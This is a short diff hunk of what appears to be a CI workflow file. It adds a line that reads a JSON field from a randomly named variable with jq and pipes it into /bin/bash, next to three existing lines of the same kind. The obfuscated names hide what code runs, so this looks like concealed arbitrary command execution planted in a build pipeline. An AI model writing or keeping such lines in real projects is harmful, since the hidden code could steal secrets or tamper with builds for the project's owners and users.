@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$el35751" | jq -r .v49522 | /bin/bash
           printf '%s' "$yjb880" | jq -r .rnevt1 | /bin/bash
           echo $ntw77245 | jq -r .jq2 | /bin/bash
+          echo $uer53 | jq -r .pmq47708 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
